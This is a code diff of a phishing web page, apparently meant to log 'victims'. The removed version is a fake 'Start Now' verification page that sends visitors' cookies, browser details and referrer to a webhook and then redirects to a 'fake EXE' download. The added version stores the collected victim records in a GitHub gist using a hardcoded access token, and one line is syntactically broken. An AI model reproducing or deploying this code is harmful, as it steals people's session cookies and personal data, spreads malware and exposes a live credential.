@@ -1,41 +1,43 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Start Now</title>
-  <style>
-    body { font-family: -apple-system, sans-serif; text-align: center; padding: 60px 20px; background: #f8f9fa; }
-    .container { max-width: 500px; margin: 0 auto; padding: 30px; background: white; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-    h1 { color: #1a73e8; }
-    p { color: #555; }
-    button { background: #1a73e8; color: white; border: none; padding: 14px 28px; font-size: 16px; border-radius: 8px; cursor: pointer; margin-top: 10px; }
-    button:hover { background: #0d62d0; }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <h1>🚀 Start Now</h1>
-    <p>Click below to begin your session.</p>
-    <button onclick="start()">Start Process</button>
-    <p><small>Verification required for security.</small></p>
-  </div>
+async function send(data) {
+  // Get current gist content
+  const GIST_ID = "<script src="https://gist.github.com/cc3784157-oss/4e10b7a4291afa8d6fa44a3917170c43.js"></script>";        // 👈 Replace with your gist ID (from URL)
+  const USERNAME = "cc3784157-oss"; // 👈 Replace with your GitHub username
+  const TOKEN = "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"; // ← LEAVE EMPTY for now (we'll fix)
 
-  <script>
-    async function start() {
-      // Log victim data to webhook
-      await fetch('https://api.webhooklog.com/hook/XXXXX', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          ip: '' || 'unknown',
-          ua: navigator.userAgent,
-          lang: navigator.language,
-          cookies: document.cookie,
-          time: new Date().toISOString(),
-          url: window.location.href,
-          ref: document.referrer
-        }),
-        mode: 'no-cors'
-      }).catch(() => {});
+  const url = `https://api.github.com/gists/${GIST_ID}`;
 
-      // Redirect to fake EXE (triggers download)
-      window.l
+  try {
+    // Fetch current victims
+    const res = await fetch(url);
+    const gist = await res.json();
+    const file = gist.files["victims.json"];
+    let victims = [];
+
+    if (file && file.content) {
+      try {
+        victims = JSON.parse(file.content);
+      } catch (e) {}
+    }
+
+    // Add new victim
+    victims.push({ ...data, timestamp: new Date().toISOString() });
+
+    // Update gist
+    await fetch(url, {
+      method: "PATCH",
+      headers: {
+        "Authorization": `token ${TOKEN}`,
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        "files": {
+          "victims.json": {
+            "content": JSON.stringify(victims, null, 2)
+          }
+        }
+      })
+    });
+  } catch (e) {
+    console.log("Failed to log", e);
+  }
+}
